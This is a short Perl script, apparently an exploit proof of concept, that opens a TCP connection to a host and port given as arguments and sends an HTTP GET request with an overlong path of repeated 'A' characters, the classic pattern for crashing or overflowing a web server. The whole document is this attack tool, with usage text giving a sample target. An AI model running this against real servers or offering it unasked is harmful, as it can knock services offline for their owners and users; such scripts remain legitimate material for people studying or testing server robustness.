#!/usr/bin/perl
use IO::Socket;

        if (@ARGV < 1) {
                usage();
        }

        $ip     = $ARGV[0];
        $port   = $ARGV[1];

        print "[+] Sending request...\n";

        $socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr =>
"$ip", PeerPort => "$port") || die "[-] Connection FAILED!\n";
        print $socket "GET
/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n";

        sleep(3);
        close($socket);

        print "[+] Done!\n";

sub usage() {
        print "[-] Usage: <". $0 ."> <host> <port>\n";
        print "[-] Example: ". $0 ." 192.168.0.1 80\n";
        exit;
}
